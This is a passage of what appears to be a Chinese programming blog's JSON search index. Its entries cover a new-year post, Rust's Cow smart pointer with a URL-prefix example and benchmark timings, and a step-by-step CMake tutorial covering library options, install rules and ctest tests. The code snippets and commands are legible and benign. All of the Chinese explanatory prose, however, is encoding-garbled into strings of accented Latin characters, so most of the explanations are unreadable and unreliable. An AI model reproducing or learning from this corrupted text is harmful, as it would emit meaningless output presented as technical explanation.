·åšé¡¹ç›®ï¼Œå­¦ä¹ æ›´å¤šçš„äººç”ŸçŸ¥è¯†ã€‚ æœ€åï¼Œæ–°çš„ä¸€å¹´ï¼Œè¦ç‰›æ°”å†²å¤©ã€‚ ","date":"2021-02-11","objectID":"/posts/goodbyte-2020/:0:0","tags":["æ–°å¹´"],"title":"å‘Šåˆ«2020åºšå­é¼ å¹´","uri":"/posts/goodbyte-2020/"},{"categories":["rust"],"content":"å®šä¹‰ Cowæ˜¯ä¸€ä¸ªæä¾›äº†å†™æ—¶å…‹éš†åŠŸèƒ½çš„æ™ºèƒ½æŒ‡é’ˆï¼Œå®ƒå¯ä»¥åŒ…è£…å¯¹æ•°æ®çš„å€Ÿç”¨ï¼Œå½“éœ€è¦ä¿®æ”¹æ•°æ®æˆ–è€…è·å–æ•°æ®çš„æ‰€æœ‰æƒæ—¶ï¼Œå¯¹æ•°æ®cloneã€‚å®ƒçš„å®šä¹‰å¦‚ä¸‹ï¼š pub enum Cow\u003c'a, B\u003e where B: 'a + ToOwned + ?Sized, { Borrowed(\u0026'a B), Owned(\u003cB as ToOwned\u003e::Owned), } Cowåä¸ºclone-on-writeï¼Œä½†æ˜¯å¯¹æ•°æ®ç±»å‹Bçš„traitè¦æ±‚æ˜¯ToOwnedï¼Œè€Œä¸æ˜¯Cloneã€‚è¿™æ˜¯å› ä¸ºCloneåªèƒ½ä»\u0026Tç”ŸæˆTï¼Œä½†æ˜¯ToOwnedæ³›åŒ–ä¸ºä»ä»»æ„ç»™å®šç±»å‹çš„å€Ÿç”¨æ•°æ®æ„å»ºæ–°ç±»å‹çš„æ•°æ®ã€‚åŠŸèƒ½æ›´ä¸ºå¼ºå¤§ã€‚ å¦‚ä¸‹ä¸€æ®µç¤ºä¾‹ä»£ç ï¼Œå°†Cowåº”ç”¨åœ¨ç»“æ„ä½“ä¸­ã€‚ use std::borrow::Cow; struct Items\u003c'a, X: 'a\u003e where [X]: ToOwned\u003cOwned = Vec\u003cX\u003e\u003e, { values: Cow\u003c'a, [X]\u003e, } impl\u003c'a, X: Clone + 'a\u003e Items\u003c'a, X\u003e where [X]: ToOwned\u003cOwned = Vec\u003cX\u003e\u003e, { fn new(v: Cow\u003c'a, [X]\u003e) -\u003e Self { Items { values: v } } } // Creates a container from borrowed values of a slice fn main() { let readonly = [1, 2]; let borrowed = Items::new((\u0026readonly[..]).into()); match borrowed { Items { values: Cow::Borrowed(b), } =\u003e println!(\"borrowed {:?}\", b), _ =\u003e panic!(\"expect borrowed value\"), } let mut clone_on_write = borrowed; // Mutates the data from slice into owned vec and pushes a new value on top clone_on_write.values.to_mut().push(3); println!(\"clone_on_write = {:?}\", clone_on_write.values); // The data was mutated. Let check it out. match clone_on_write { Items { values: Cow::Owned(_), } =\u003e println!(\"clone_on_write contains owned data\"), _ =\u003e panic!(\"expect owned data\"), } } è¿è¡Œç”Ÿæˆå¦‚ä¸‹ç»“æœï¼Œå¯è§å¯¹å€Ÿç”¨çš„æ•°æ®è¿›è¡Œä¿®æ”¹åï¼Œå‘ç”Ÿäº†å…‹éš†ã€‚ borrowed [1, 2] clone_on_write = [1, 2, 3] clone_on_write contains owned data ","date":"2021-01-30","objectID":"/posts/rust-smartpointer-cow/:1:0","tags":["rust","æ™ºèƒ½æŒ‡é’ˆ","cow"],"title":"Rustæ™ºèƒ½æŒ‡é’ˆCow","uri":"/posts/rust-smartpointer-cow/"},{"categories":["rust"],"content":"ä½¿ç”¨ è¯•æƒ³è¿™æ ·ä¸€ä¸ªåœºæ™¯ï¼Œæˆ‘ä»¬éœ€è¦ç»™å¤„ç†ä¸€äº›Urlï¼Œå…¶ä¸­ä¸€éƒ¨åˆ†æ˜¯https://å¼€å¤´çš„ï¼Œè€Œå¦ä¸€éƒ¨åˆ†ä¸æ˜¯ï¼Œç°åœ¨è¦ç»™ç¼ºå°‘https://å‰ç¼€çš„UrlåŠ ä¸Šå‰ç¼€ã€‚ ä½¿ç”¨Cowï¼Œå‡½æ•°å¦‚ä¸‹ï¼š fn add_prefix_by_cow\u003c'a, T\u003e(urls: T, prefix: \u0026str) -\u003e Vec\u003cCow\u003c'a, String\u003e\u003e where T: IntoIterator\u003cItem = \u0026'a String\u003e, { urls.into_iter() .map(|url| { if url.starts_with(prefix) { Cow::Borrowed(url) } else { Cow::Owned(String::with_capacity(url.len() + prefix.len()) + prefix + url) } }) .collect() } ä¸ä½¿ç”¨Cowï¼Œå‡½æ•°å¦‚ä¸‹ï¼š fn add_prefix_by_clone\u003c'a, T\u003e(urls: T, prefix: \u0026'a str) -\u003e Vec\u003cString\u003e where T: IntoIterator\u003cItem = \u0026'a String\u003e, { urls.into_iter() .map(|url| { if url.starts_with(prefix) { url.clone() } else { url.clone() + prefix } }) .collect() } ç”¨Criterionæ¥è¿›è¡Œ benchmark æµ‹è¯• fn bench(c: \u0026mut Criterion) { let mut group = c.benchmark_group(\"cow_bench\"); group.sampling_mode(SamplingMode::Linear); group.bench_function(\"cow\", |b| { b.iter_batched( || { let pre = vec![\"https://127.0.0.1\".to_string(); 1024]; let non_pre = vec![\"127.0.0.1\".to_string(); 1024]; [pre, non_pre].concat() }, |v| { let _ = add_prefix_by_cow(\u0026v, \"https://\"); }, BatchSize::SmallInput, ) }); group.bench_function(\"clone\", |b| { b.iter_batched( || { let pre = vec![\"https://127.0.0.1\".to_string(); 1024]; let non_pre = vec![\"127.0.0.1\".to_string(); 1024]; [pre, non_pre].concat() }, |v| { let _ = add_prefix_by_clone(\u0026v, \"https://\"); }, BatchSize::SmallInput, ) }); group.finish(); } è¾“å‡ºå¦‚ä¸‹ï¼š cow_bench/cow time: [256.10 us 259.48 us 262.41 us] cow_bench/clone time: [448.13 us 457.38 us 467.73 us] ç”Ÿæˆåˆ†æå›¾ç‰‡å¦‚ä¸‹å›¾æ‰€ç¤ºï¼Œå¯è§Cowåœ¨å¤§é‡çš„å†…å­˜æ“ä½œæ—¶ï¼Œèƒ½å°½å¯èƒ½çš„è¿›è¡Œå†…å­˜å…±äº«ï¼Œå»¶è¿Ÿè€—æ—¶çš„å…‹éš†æ“ä½œï¼Œè¿›è¡Œæ›´åŠ ç»†è‡´çš„å†…å­˜æ“ä½œæ§åˆ¶ã€‚ ","date":"2021-01-30","objectID":"/posts/rust-smartpointer-cow/:2:0","tags":["rust","æ™ºèƒ½æŒ‡é’ˆ","cow"],"title":"Rustæ™ºèƒ½æŒ‡é’ˆCow","uri":"/posts/rust-smartpointer-cow/"},{"categories":["æ„å»ºå·¥å…·"],"content":"æœ€è¿‘å› ä¸ºæ¯•è®¾çš„åŸå› ï¼Œéœ€è¦çœ‹ Cpp é¡¹ç›®ï¼Œé¦–å…ˆé¡¹ç›®æ„å»ºå°±æ¶‰åŠåˆ°äº† CMakeï¼Œæ‰€ä»¥è·Ÿç€ CMake å®˜ç½‘çš„ Tutorial å­¦ä¹ äº†ä¸€ä¸‹ï¼Œè¯¥æ–‡ç« ç®—æ˜¯å®˜ç½‘æ•™ç¨‹çš„æ¬è¿ã€‚ Tutorial ç‚¹è¿™é‡Œ, GitHub ä»£ç ç‚¹è¿™é‡Œ. ","date":"2020-10-29","objectID":"/posts/cmake-tutorial/:0:0","tags":["CMake"],"title":"CMake Tutorial","uri":"/posts/cmake-tutorial/"},{"categories":["æ„å»ºå·¥å…·"],"content":"æ„å»ºç®€å•é¡¹ç›® æœ€åŸºæœ¬çš„ CMake é¡¹ç›®æ˜¯ç”±æºä»£ç æ–‡ä»¶æ„å»ºå¯æ‰§è¡Œæ–‡ä»¶ã€‚å¯¹äºç®€å•çš„é¡¹ç›®ï¼Œåªéœ€è¦ä¸€ä¸ªä¸‰è¡Œçš„ CMakeLists.txt æ–‡ä»¶ã€‚è¿™å°†æ˜¯æˆ‘ä»¬ tutorial çš„èµ·ç‚¹ã€‚ ","date":"2020-10-29","objectID":"/posts/cmake-tutorial/:1:0","tags":["CMake"],"title":"CMake Tutorial","uri":"/posts/cmake-tutorial/"},{"categories":["æ„å»ºå·¥å…·"],"content":"å¼€å§‹é¡¹ç›® cmake_minimum_required(VERSION 3.10) # set the project name project(Tutorial) # add the executable add_executable(Tutorial tutorial.cxx) æºä»£ç tutorial.cxxå¦‚ä¸‹ // A simple program that computes the square root of a number #include \u003ccmath\u003e #include \u003ccstdlib\u003e #include \u003ciostream\u003e #include \u003cstring\u003e int main(int argc, char* argv[]) { if (argc \u003c 2) { std::cout \u003c\u003c \"Usage: \" \u003c\u003c argv[0] \u003c\u003c \" number\" \u003c\u003c std::endl; return 1; } // convert input to double const double inputValue = atof(argv[1]); // calculate square root const double outputValue = sqrt(inputValue); std::cout \u003c\u003c \"The square root of \" \u003c\u003c inputValue \u003c\u003c \" is \" \u003c\u003c outputValue \u003c\u003c std::endl; return 0; } ","date":"2020-10-29","objectID":"/posts/cmake-tutorial/:1:1","tags":["CMake"],"title":"CMake Tutorial","uri":"/posts/cmake-tutorial/"},{"categories":["æ„å»ºå·¥å…·"],"content":"æ·»åŠ ç‰ˆæœ¬å·å¹¶é…ç½®å¤´æ–‡ä»¶ æ·»åŠ ç‰ˆæœ¬å· #set the project name and version project(Tutorial VERSION 1.0) ç„¶åï¼Œé…ç½®ä¸€ä¸ªå¤´æ–‡ä»¶ï¼Œå°†ç‰ˆæœ¬å·ä¼ é€’ç»™æºä»£ç  configure_file(TutorialConfig.h.in TutorialConfig.h) ç”±äºé…ç½®çš„æ–‡ä»¶å°†è¢«å†™å…¥äºŒå‰æ ‘ï¼Œæ‰€ä»¥æˆ‘ä»¬å¿…é¡»å°†è¯¥ç›®å½•æ·»åŠ åˆ°æœç´¢ include æ–‡ä»¶çš„è·¯å¾„åˆ—è¡¨ä¸­ï¼ˆè¯¥å£°æ˜æ”¾åœ¨add_executableä¹‹åï¼‰: target_include_directories(Tutorial PUBLIC \"${PROJECT_BINARY_DIR}\" ) æ–°å»ºTutorialConfig.h.in // the configured options and settings for Tutorial #define Tutorial_VERSION_MAJOR @Tutorial_VERSION_MAJOR@ #define Tutorial_VERSION_MINOR @Tutorial_VERSION_MINOR@ å½“ CMake é…ç½®è¿™ä¸ªå¤´æ–‡ä»¶æ—¶ï¼Œ@Tutorial_VERSION_MAJOR@å’Œ@Tutorial_VERSION_MINOR@çš„å€¼å°†è¢«æ›¿æ¢ã€‚ æ¥ç€ï¼Œä¿®æ”¹æºä»£ç ï¼Œinclude å¤´æ–‡ä»¶TutorialConfig.hã€‚ç„¶åï¼Œæ›´æ–°æºä»£ç æ‰“å°å‡ºå¯æ‰§è¡Œæ–‡ä»¶çš„åç§°å’Œç‰ˆæœ¬å·ï¼š if (argc \u003c 2) { // report version std::cout \u003c\u003c argv[0] \u003c\u003c \" Version \" \u003c\u003c Tutorial_VERSION_MAJOR \u003c\u003c \".\" \u003c\u003c Tutorial_VERSION_MINOR \u003c\u003c std::endl; std::cout \u003c\u003c \"Usage: \" \u003c\u003c argv[0] \u003c\u003c \" number\" \u003c\u003c std::endl; return 1; } æŒ‡å®šä½¿ç”¨ C++11 æ ‡å‡†ï¼Œä½¿ç”¨std::stod cmake_minimum_required(VERSION 3.10) # set the project name and version project(Tutorial VERSION 1.0) # specify the C++ standard set(CMAKE_CXX_STANDARD 11) set(CMAKE_CXX_STANDARD_REQUIRED True) CMAKE_CXX_STANDARD ç”Ÿå‘½å¿…é¡»æ”¾åœ¨ add_executable ä¹‹å‰ ","date":"2020-10-29","objectID":"/posts/cmake-tutorial/:1:2","tags":["CMake"],"title":"CMake Tutorial","uri":"/posts/cmake-tutorial/"},{"categories":["æ„å»ºå·¥å…·"],"content":"æ„å»ºå¹¶æµ‹è¯• é¦–å…ˆæ„å»º mkdir step1_build cd step1_build cmake .. cmake --build . ç„¶åæµ‹è¯• Tutorial 4294967296 Tutorial 10 Tutorial ","date":"2020-10-29","objectID":"/posts/cmake-tutorial/:1:3","tags":["CMake"],"title":"CMake Tutorial","uri":"/posts/cmake-tutorial/"},{"categories":["æ„å»ºå·¥å…·"],"content":"æ·»åŠ ä¸€ä¸ªåº“ æˆ‘ä»¬å°†å‘é¡¹ç›®ä¸­æ·»åŠ ä¸€ä¸ªåº“ã€‚è¿™ä¸ªåº“å°†åŒ…å«äº†è‡ªå®šä¹‰çš„å¹³æ–¹æ ¹å‡½æ•°çš„å®ç°ã€‚ä¹‹åï¼Œåœ¨å¯æ‰§è¡Œæ–‡ä»¶ä¸­ä½¿ç”¨ç”¨è¿™ä¸ªåº“ï¼Œæ›¿æ¢ç¼–è¯‘å™¨æä¾›çš„æ ‡å‡†å¹³æ–¹æ ¹å‡½æ•°ã€‚ æ–°å»ºMathFunctionsç›®å½•ï¼Œåœ¨å…¶ä¸‹æ·»åŠ CMakeLists.txt,æ·»åŠ å¦‚ä¸‹å†…å®¹: add_library(MathFunctions mysqrt.cxx) mysqrt.cxxå¦‚ä¸‹ï¼š #include \u003ciostream\u003e // a hack square root calculation using simple operations double mysqrt(double x) { if (x \u003c= 0) { return 0; } double result = x; // do ten iterations for (int i = 0; i \u003c 10; ++i) { if (result \u003c= 0) { result = 0.1; } double delta = x - (result * result); result = result + 0.5 * delta / result; std::cout \u003c\u003c \"Computing sqrt of \" \u003c\u003c x \u003c\u003c \" to be \" \u003c\u003c result \u003c\u003c std::endl; } return result; } ä¸ºäº†ä½¿ç”¨æ–°åº“ï¼Œæˆ‘ä»¬å°†åœ¨é¡¶å±‚çš„CMakeLists.txtæ–‡ä»¶ä¸­æ·»åŠ ä¸€ä¸ªadd subdirectory()è°ƒç”¨ï¼Œä»¥ä¾¿æ„å»ºåº“ã€‚æˆ‘ä»¬å°†æ–°åº“æ·»åŠ åˆ°å¯æ‰§è¡Œæ–‡ä»¶ä¸­ï¼Œå¹¶å°†MathFunctionsæ·»åŠ ä¸º include ç›®å½•ï¼Œä»¥ä¾¿å¯ä»¥æ‰¾åˆ°mqsqrt.hå¤´æ–‡ä»¶ã€‚é¡¶å±‚çš„CMakeLists.txtæ–‡ä»¶çš„æœ€åå‡ è¡Œç°åœ¨çœ‹èµ·æ¥åº”è¯¥æ˜¯è¿™æ ·çš„ï¼š # add the MathFunctions library add_subdirectory(MathFunctions) # add the executable add_executable(Tutorial tutorial.cxx) target_link_libraries(Tutorial PUBLIC MathFunctions) # add the binary tree to the search path for include files # so that we will find TutorialConfig.h target_include_directories(Tutorial PUBLIC \"${PROJECT_BINARY_DIR}\" \"${PROJECT_SOURCE_DIR}/MathFunctions\" ) ç°åœ¨è®©æˆ‘ä»¬æŠŠ MathFunctions åº“å˜æˆå¯é€‰çš„ã€‚è™½ç„¶å¯¹äºæœ¬æ•™ç¨‹æ¥è¯´ï¼Œæ²¡æœ‰å¿…è¦è¿™æ ·åšï¼Œä½†å¯¹äºå¤§å‹é¡¹ç›®æ¥è¯´ï¼Œè¿™æ˜¯ä¸€ç§å¸¸è§çš„æƒ…å†µã€‚ç¬¬ä¸€æ­¥æ˜¯åœ¨é¡¶å±‚çš„ CMakeLists.txt æ–‡ä»¶ä¸­æ·»åŠ ä¸€ä¸ªé€‰é¡¹ï¼ˆoptionæ”¾åœ¨configure_fileå‰é¢ï¼‰: option(USE_MYMATH \"Use tutorial provided math implementation\" ON) # configure a header file to pass some of the CMake settings # to the source code configure_file(TutorialConfig.h.in TutorialConfig.h) è¿™ä¸ªé€‰é¡¹ä¼šåœ¨ cmake-gui å’Œ ccmake ä¸­æ˜¾ç¤ºï¼Œé»˜è®¤å€¼ä¸º ONï¼Œç”¨æˆ·å¯ä»¥æ›´æ”¹ã€‚è¿™ä¸ªè®¾ç½®å°†è¢«ä¿å­˜åœ¨ç¼“å­˜ä¸­ï¼Œè¿™æ ·ç”¨æˆ·å°±ä¸éœ€è¦åœ¨æ¯æ¬¡è¿è¡Œ CMake çš„æ—¶å€™è®¾ç½®è¿™ä¸ªå€¼ã€‚ ä¸‹ä¸€ä¸ªæ­¥æ˜¯ä½¿æ„å»ºå’Œé“¾æ¥MathFunctionsåº“æˆä¸ºæ¡ä»¶åˆ¤æ–­çš„ã€‚è¦åšåˆ°è¿™ä¸€ç‚¹ï¼Œæˆ‘ä»¬å°†é¡¶å±‚CMakeLists.txtæ–‡ä»¶çš„ç»“å°¾æ”¹ä¸ºå¦‚ä¸‹æ‰€ç¤º: if(USE_MYMATH) add_subdirectory(MathFunctions) list(APPEND EXTRA_LIBS MathFunctions) list(APPEND EXTRA_INCLUDES \"${PROJECT_SOURCE_DIR}/MathFunctions\") endif() # add the executable add_executable(Tutorial tutorial.cxx) target_link_libraries(Tutorial PUBLIC ${EXTRA_LIBS}) # add the binary tree to the search path for include files # so that we will find TutorialConfig.h target_include_directories(Tutorial PUBLIC \"${PROJECT_BINARY_DIR}\" ${EXTRA_INCLUDES} ) è¯·æ³¨æ„ä½¿ç”¨å˜é‡EXTRA_LIBSæ¥æ”¶é›†ä»»ä½•å¯é€‰çš„åº“ï¼Œä»¥ä¾¿ä»¥åé“¾æ¥åˆ°å¯æ‰§è¡Œæ–‡ä»¶ä¸­ã€‚å˜é‡EXTRA_INCLUDESä¹ŸåŒæ ·ç”¨äºå¤„ç†å¯é€‰çš„å¤´æ–‡ä»¶ã€‚è¿™æ˜¯åœ¨å¤„ç†è®¸å¤šå¯é€‰ç»„ä»¶æ—¶çš„ä¼ ç»Ÿæ–¹æ³•ï¼Œä¸‹ä¸€æ­¥è®²ä»‹ç»æ›´ä¸ºç°ä»£åŒ–æ–¹æ³•ã€‚ ç›¸åº”çš„ï¼Œéœ€è¦ç®€å•ä¿®æ”¹æºä»£ç ã€‚é¦–å…ˆï¼Œåœ¨tutorial.cxxä¸­ï¼Œå¦‚æœæˆ‘ä»¬éœ€è¦çš„è¯ï¼Œå°±åŠ å…¥MathFunctions.hå¤´æ–‡ä»¶ï¼š #ifdef USE_MYMATH # include \"MathFunctions.h\" #endif ç„¶åï¼Œä½¿ç”¨USE_MYMATHæ§åˆ¶åº“å‡½æ•°çš„è°ƒç”¨ï¼š #ifdef USE_MYMATH const double outputValue = mysqrt(inputValue); #else const double outputValue = sqrt(inputValue); #endif ç”±äºæºä»£ç ç°åœ¨éœ€è¦ USE_MYMATHï¼Œ æˆ‘ä»¬å¯ä»¥åœ¨ TutorialConfig.h.inä¸­åŠ å…¥ä¸‹é¢è¿™è¡Œ: #cmakedefine USE_MYMATH æ¥ä¸‹æ¥ï¼Œåœ¨æ„å»ºæ—¶ï¼Œå¯ä»¥ä½¿ç”¨-Dæ·»åŠ ä½¿ç”¨é€‰é¡¹ï¼Œä¾‹å¦‚è¦å…³é—­é€‰é¡¹ï¼Œä½¿ç”¨ï¼š cmake .. -DUSE_MYMATH=OFF ","date":"2020-10-29","objectID":"/posts/cmake-tutorial/:2:0","tags":["CMake"],"title":"CMake Tutorial","uri":"/posts/cmake-tutorial/"},{"categories":["æ„å»ºå·¥å…·"],"content":"æ·»åŠ åº“çš„ä½¿ç”¨æ¡ä»¶ ä½¿ç”¨æ¡ä»¶å…è®¸æ›´å¥½åœ°æ§åˆ¶åº“æˆ–å¯æ‰§è¡Œæ–‡ä»¶çš„é“¾æ¥å’Œincludeè¡Œï¼ŒåŒæ—¶ä¹Ÿç»™äºˆ CMake å†…éƒ¨ target çš„è½¬ä¹‰å±æ€§æ›´å¤šçš„æ§åˆ¶ã€‚åˆ©ç”¨ä½¿ç”¨æ¡ä»¶çš„ä¸»è¦å‘½ä»¤æœ‰: target_compile_definitions() target_compile_options() target_include_directories() target_link_libraries() è®©æˆ‘ä»¬ä»æ­¥éª¤ 2 å¼€å§‹ä¸­é‡æ„æˆ‘ä»¬çš„ä»£ç ï¼Œä½¿ç”¨ç°ä»£ CMake çš„ä½¿ç”¨æ¡ä»¶æ–¹æ³•ã€‚æˆ‘ä»¬é¦–å…ˆå£°æ˜ï¼Œä»»ä½•äººé“¾æ¥åˆ°MathFunctionséƒ½éœ€è¦åŒ…å«å½“å‰ç›®å½•ï¼Œè€ŒMathFunctionsæœ¬èº«ä¸éœ€è¦ã€‚æ‰€ä»¥è¿™å¯ä»¥æˆä¸ºä¸€ä¸ªINTERFACEçš„ä½¿ç”¨æ¡ä»¶ã€‚ è®°ä½ï¼ŒINTERFACEæ˜¯æŒ‡ä½¿ç”¨è€…éœ€è¦è€Œæä¾›è€…ä¸éœ€è¦çš„ä¸œè¥¿ã€‚åœ¨MathFunctions/CMakeLists.txtçš„æœ«å°¾æ·»åŠ ä»¥ä¸‹å‡ è¡Œ: target_include_directories(MathFunctions INTERFACE ${CMAKE_CURRENT_SOURCE_DIR} ) ç°åœ¨æˆ‘ä»¬å·²ç»æŒ‡å®šäº† MathFunctionsçš„ä½¿ç”¨æ¡ä»¶ï¼Œæˆ‘ä»¬å¯ä»¥å®‰å…¨åœ°ä»é¡¶å±‚çš„ CMakeLists.txtä¸­åˆ é™¤å¯¹ EXTRA_INCLUDES å˜é‡çš„ä½¿ç”¨ã€‚ æ­¤å¤„ if(USE_MYMATH) # add the MathFunctions library add_subdirectory(MathFunctions) list(APPEND EXTRA_LIBS MathFunctions) endif() å’Œæ­¤å¤„ target_include_directories(Tutorial PUBLIC \"${PROJECT_BINARY_DIR}\" ) ä¹‹åä¾¿å¯ä»¥é‡æ–°æ„å»ºé¡¹ç›®äº†ã€‚ ","date":"2020-10-29","objectID":"/posts/cmake-tutorial/:3:0","tags":["CMake"],"title":"CMake Tutorial","uri":"/posts/cmake-tutorial/"},{"categories":["æ„å»ºå·¥å…·"],"content":"å®‰è£…å’Œæµ‹è¯• ç°åœ¨æˆ‘ä»¬å¯ä»¥å¼€å§‹ä¸ºæˆ‘ä»¬çš„é¡¹ç›®æ·»åŠ å®‰è£…è§„åˆ™å’Œæµ‹è¯•æ”¯æŒã€‚ ","date":"2020-10-29","objectID":"/posts/cmake-tutorial/:4:0","tags":["CMake"],"title":"CMake Tutorial","uri":"/posts/cmake-tutorial/"},{"categories":["æ„å»ºå·¥å…·"],"content":"å®‰è£…è§„åˆ™ å®‰è£…è§„åˆ™ç›¸å½“ç®€å•ï¼šå¯¹äºMathFunctionsï¼Œæˆ‘ä»¬è¦å®‰è£…åº“å’Œå¤´æ–‡ä»¶ï¼Œå¯¹äºåº”ç”¨ç¨‹åºï¼Œæˆ‘ä»¬è¦å®‰è£…å¯æ‰§è¡Œæ–‡ä»¶å’Œé…ç½®çš„å¤´æ–‡ä»¶ã€‚ æ‰€ä»¥åœ¨MathFunctions/CMakeLists.txtä¸­æ·»åŠ ï¼š install(TARGETS MathFunctions DESTINATION lib) install(FILES MathFunctions.h DESTINATION include) åœ¨é¡¶å±‚çš„CMakeLists.txtä¸­ æ·»åŠ ï¼š install(TARGETS Tutorial DESTINATION bin) install(FILES \"${PROJECT_BINARY_DIR}/TutorialConfig.h\" DESTINATION include ) è¿™å°±æ˜¯ä¸ºtutorialåˆ›å»ºä¸€ä¸ªåŸºæœ¬çš„æœ¬åœ°å®‰è£…æ‰€éœ€è¦çš„å…¨éƒ¨å†…å®¹ã€‚ ç°åœ¨é‡æ–°æ¥é…ç½®é¡¹ç›®å¹¶æ„å»ºå®ƒã€‚ç„¶ååœ¨å‘½ä»¤è¡Œä½¿ç”¨cmake å‘½ä»¤çš„install é€‰é¡¹æ¥è¿è¡Œå®‰è£…æ­¥éª¤ (åœ¨ 3.15 ä¸­å¼•å…¥ï¼Œæ—§ç‰ˆæœ¬çš„ CMake å¿…é¡»ä½¿ç”¨ make install)ã€‚å¯¹äºå¤šé…ç½®å·¥å…·ï¼Œä¸è¦å¿˜è®°ä½¿ç”¨â€“config å‚æ•°æ¥æŒ‡å®šé…ç½®ã€‚å¦‚æœä½¿ç”¨ IDEï¼Œåªéœ€æ„å»ºINSTALL targetã€‚è¿™ä¸€æ­¥å°†å®‰è£…ç›¸åº”çš„å¤´æ–‡ä»¶ã€åº“å’Œå¯æ‰§è¡Œæ–‡ä»¶ã€‚ä¾‹å¦‚: cmake --install . CMake å˜é‡ CMAKE_INSTALL_PREFIX ç”¨äºç¡®å®šæ–‡ä»¶å®‰è£…çš„æ ¹ç›®å½•ã€‚å¦‚æœä½¿ç”¨ cmake --install å‘½ä»¤ï¼Œå®‰è£…ç›®å½•å¯ä»¥é€šè¿‡ --prefixå‚æ•°é‡å†™ã€‚ä¾‹å¦‚ï¼š cmake --install . --prefix \"/home/myuser/installdir\" ","date":"2020-10-29","objectID":"/posts/cmake-tutorial/:4:1","tags":["CMake"],"title":"CMake Tutorial","uri":"/posts/cmake-tutorial/"},{"categories":["æ„å»ºå·¥å…·"],"content":"æµ‹è¯•æ”¯æŒ æ¥ä¸‹æ¥ï¼Œæµ‹è¯•æˆ‘ä»¬çš„åº”ç”¨ç¨‹åºã€‚åœ¨é¡¶å±‚çš„CMakeLists.txtæ–‡ä»¶çš„æœ«å°¾ï¼Œæˆ‘ä»¬å¯ä»¥å¯ç”¨æµ‹è¯•ï¼Œç„¶åæ·»åŠ ä¸€äº›åŸºæœ¬æµ‹è¯•ä»¥éªŒè¯åº”ç”¨ç¨‹åºæ˜¯å¦æ­£å¸¸è¿è¡Œã€‚ enable_testing() # does the application run add_test(NAME Runs COMMAND Tutorial 25) # does the usage message work? add_test(NAME Usage COMMAND Tutorial) set_tests_properties(Usage PROPERTIES PASS_REGULAR_EXPRESSION \"Usage:.*number\" ) # define a function to simplify adding tests function(do_test target arg result) add_test(NAME Comp${arg} COMMAND ${target} ${arg}) set_tests_properties(Comp${arg} PROPERTIES PASS_REGULAR_EXPRESSION ${result} ) endfunction(do_test) # do a bunch of result based tests do_test(Tutorial 4 \"4 is 2\") do_test(Tutorial 9 \"9 is 3\") do_test(Tutorial 5 \"5 is 2.236\") do_test(Tutorial 7 \"7 is 2.645\") do_test(Tutorial 25 \"25 is 5\") do_test(Tutorial -25 \"-25 is [-nan|nan|0]\") do_test(Tutorial 0.0001 \"0.0001 is 0.01\") ç¬¬ä¸€ä¸ªæµ‹è¯•åªæ˜¯ç®€å•åœ°éªŒè¯åº”ç”¨ç¨‹åºæ˜¯å¦è¿è¡Œï¼Œæ²¡æœ‰ segfault æˆ–å…¶ä»–å´©æºƒï¼Œå¹¶ä¸”è¿”å›å€¼ä¸ºé›¶ã€‚è¿™æ˜¯ CTest æµ‹è¯•çš„åŸºæœ¬å½¢å¼ã€‚ ä¸‹ä¸€ä¸ªæµ‹è¯•åˆ©ç”¨PASS_REGULAR_EXPRESSIONæµ‹è¯•å±æ€§æ¥éªŒè¯æµ‹è¯•çš„è¾“å‡ºæ˜¯å¦åŒ…å«æŸäº›å­—ç¬¦ä¸²ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼ŒéªŒè¯å½“æä¾›çš„å‚æ•°æ•°é‡ä¸æ­£ç¡®æ—¶ï¼Œæ˜¯å¦ä¼šæ‰“å°å‡ºä½¿ç”¨ä¿¡æ¯ã€‚ æœ€åï¼Œæˆ‘ä»¬æœ‰ä¸€ä¸ªåä¸º do_test çš„å‡½æ•°ï¼Œå®ƒè¿è¡Œåº”ç”¨ç¨‹åºå¹¶éªŒè¯ç»™å®šè¾“å…¥çš„è®¡ç®—å¹³æ–¹æ ¹æ˜¯å¦æ­£ç¡®ã€‚æ¯è°ƒç”¨ä¸€æ¬¡do_testï¼Œå°±ä¼šåœ¨é¡¹ç›®ä¸­æ·»åŠ ä¸€ä¸ªæµ‹è¯•ï¼ŒåŒ…æ‹¬åç§°ã€è¾“å…¥å’ŒåŸºäºä¼ é€’çš„å‚æ•°çš„é¢„æœŸç»“æœã€‚ é‡æ–°æ„å»ºåº”ç”¨ç¨‹åºï¼Œç„¶å cd åˆ°äºŒè¿›åˆ¶ç›®å½•ï¼Œè¿è¡Œctestå¯æ‰§è¡Œæ–‡ä»¶ï¼šctest -Nï¼ˆ--show-only[=format]ï¼‰å’Œctest -VVï¼ˆ--extra-verboseï¼‰ã€‚å¯¹äºå¤šé…ç½®ç”Ÿæˆå™¨ï¼ˆå¦‚ Visual Studioï¼‰ï¼Œå¿…é¡»æŒ‡å®šé…ç½®ç±»å‹ã€‚ä¾‹å¦‚ï¼Œè¦åœ¨ Debug æ¨¡å¼ä¸‹è¿è¡Œæµ‹è¯•ï¼Œä»æ„å»ºç›®å½•ä¸­ä½¿ç”¨ctest -C Debug -VVï¼ˆä¸æ˜¯ Debug å­ç›®å½•ï¼ï¼‰ã€‚æˆ–è€…ï¼Œä» IDE ä¸­æ„å»ºRUN_TESTSç›®æ ‡ã€‚ ","date":"2020-10-29","objectID":"/posts/cmake-tutorial/:4:2","tags":["CMake"],"title":"CMake Tutorial","uri":"/posts/cmake-tutorial/"},{"categories":["æ„å»ºå·¥å…·"],"content":"æ·»åŠ ç³»ç»Ÿè‡ªæ£€ è®©æˆ‘ä»¬è€ƒè™‘åœ¨æˆ‘ä»¬çš„é¡¹ç›®ä¸­æ·»åŠ ä¸€äº›ä»£ç ï¼Œè¿™äº›ä»£ç å–å†³äºç›®æ ‡å¹³å°å¯èƒ½æ²¡æœ‰çš„åŠŸèƒ½ã€‚åœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼Œæˆ‘ä»¬å°†æ·»åŠ ä¸€äº›ä»£ç ï¼Œè¿™äº›ä»£ç å–å†³äºç›®æ ‡å¹³å°æ˜¯å¦æœ‰ log å’Œ exp å‡½æ•°ã€‚å½“ç„¶ï¼Œå‡ ä¹æ¯ä¸ªå¹³å°éƒ½æœ‰è¿™äº›å‡½æ•°ï¼Œä½†åœ¨æœ¬æ•™ç¨‹ä¸­ï¼Œå‡è®¾å®ƒä»¬å¹¶ä¸å¸¸è§ã€‚ å¦‚æœå¹³å°ä¸Šæœ‰ log å’Œ expï¼Œé‚£ä¹ˆæˆ‘ä»¬å°†ä½¿ç”¨å®ƒä»¬æ¥è®¡ç®— mysqrt 